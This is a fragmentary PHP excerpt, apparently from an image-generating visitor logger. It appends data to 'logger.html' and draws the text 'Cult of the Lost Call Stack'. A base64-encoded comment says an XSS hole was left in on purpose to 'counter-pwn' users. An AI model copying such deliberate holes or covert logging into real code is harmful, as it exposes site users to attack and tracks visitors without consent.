...
$fp = fopen("logger.html", "a"); // WFNTIHZ1bG4gc28geW91IGNhbiBjb3VudGVyLXB3biBza2lkcyB3aG8gY2FudCBtb2RpZnkgdGhpcyBjb2Rl
fputs($fp, "
...
imagestring( $my_img, 4, 30, 25, "Cult of the Lost Call Stack",
  $text_colour );
